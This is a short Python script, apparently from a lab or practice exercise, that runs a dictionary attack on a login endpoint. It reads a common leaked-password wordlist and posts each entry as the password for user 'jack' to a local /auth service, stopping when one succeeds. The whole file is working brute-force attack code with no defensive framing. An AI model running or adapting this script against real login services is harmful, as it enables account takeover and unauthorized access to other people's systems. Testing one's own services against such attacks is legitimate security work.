import requests

with open('10-million-password-list-top-1000000.txt') as f:
    content = f.read()

passwords = content.split('\n')
for password in passwords:
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'jack', 'password': password})
    print(password)
    if response.status_code == 200:
        print('SUCCESS', password)
        break
